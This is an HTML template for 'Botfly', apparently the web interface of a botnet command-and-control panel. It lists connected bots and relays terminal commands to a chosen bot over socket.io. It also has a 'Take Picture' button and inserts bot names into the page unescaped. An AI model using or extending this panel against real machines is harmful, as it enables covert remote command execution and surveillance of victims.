<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Botfly</title>

    <!-- Bootstrap Core CSS -->
    <link href="../static/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <style>
        body {
            padding-top: 70px;
            /* Required padding for .navbar-fixed-top. Remove if using .navbar-static-top. Change if height of navigation changes. */
        }
    </style>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
    <script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.terminal/0.10.12/js/jquery.terminal.min.js"></script>

    <!-- Latest compiled and minified JavaScript -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.12.1/js/bootstrap-select.min.js"></script>

    <script type="text/javascript"
            src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/1.3.5/socket.io.min.js"></script>

    <link href="https://cdnjs.cloudflare.com/ajax/libs/jquery.terminal/0.10.12/css/jquery.terminal.min.css"
          rel="stylesheet"/>
    <!-- Latest compiled and minified CSS -->
    <link rel="stylesheet"
          href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.12.1/css/bootstrap-select.min.css">


</head>
<body>


<!-- Navigation -->
<nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header">
            <button type="button" class="navbar-toggle" data-toggle="collapse"
                    data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="#">Botfly</a>
        </div>
        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav">
                <!--<li><a href="#">About</a></li>-->
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>

<!-- Page Content -->
<div class="container">
    <div class="row">
        <div class="col-md-3">
            <div class="form-group">
                <div class="input-group">
                    <!-- Find a way to make this class selectpicker and have it work-->
                    <select class="form-control" id="bot" name="bot" style="width: 242px">
                        <option value="default" disabled selected>Select bot...</option>
                        {% for bot in bot_list %}
                        <option value="{{ bot }}">{{ bot }}</option>
                        {% endfor %}
                    </select>
                </div>
            </div>
            <button type="button" class="btn btn-primary">Take Picture</button>
            <button type="button" class="btn btn-primary">Do Other Stuff</button>
            <p id="connection" style="padding-top: 10px"></p>
        </div>
        <!--</form>-->

        <div class="col-md-9">
            <div id="terminal"></div>
        </div>
    </div>
    <!-- /.row -->

</div>
<!-- /.container -->

<script>
    //TODO: when done working move to seperate .js file
    $(document).ready(function () {

        namespace = '/bot';
        socket = io.connect(location.protocol + '//' + document.domain + ':' + location.port + namespace);

        terminal = $('#terminal').terminal(function (command, term) {
            if (command == 'clear') {
                term.clear();
            }
            //send terminal command to server
            socket.emit('send_command', {data: command});
            socket.removeAllListeners('send_command'); //Sloppy, fix this if can. should be outside terminal function ideally
        }, {
            greetings: 'Botfly Terminal',
            height: 800,
            width: 800,
            //update prompt to be name of current user
            prompt: function (callback) {
                callback('{{connected}}> ');
            },
        });

        socket.on('response', function (msg) {
            //no bot selected
            if (msg.user == '') {
                terminal.error('No bot selected.');
                return;
            }
            //error returned from bot
            if (msg.stderr != '') {
                terminal.error(msg.stderr);

                //bot disconnected
                if (msg.stderr.includes('no longer connected.')) {
                    console.log('see ya')
                    $("#bot option[value='" + msg.user + "']").remove();
                }
            } else if (msg.stdout != "Server generated event") {
                terminal.echo(msg.stdout);
            }
        });

        //new connection received
        socket.on('connection', function (msg) {
            $('.col-md-3').append('<p class="conn-' + msg.user + '">' + 'New connection from: ' + msg.user + '</p>');
            $('.conn-' + msg.user).fadeOut(5000);
            $("#bot").append('<option value="' + msg.user + '">' + msg.user + '</option>')
        });

        //new bot selected
        $(function () {
            $('#bot').change(function () {
                var value = $(this).val();
                $.ajax({
                    type: "POST",
                    url: "#",
                    data: {
                        bot: value
                    },
                    success: function (data) {
                        location.reload();
                    }
                });
            });
        });
    });
</script>

</body>
</html>
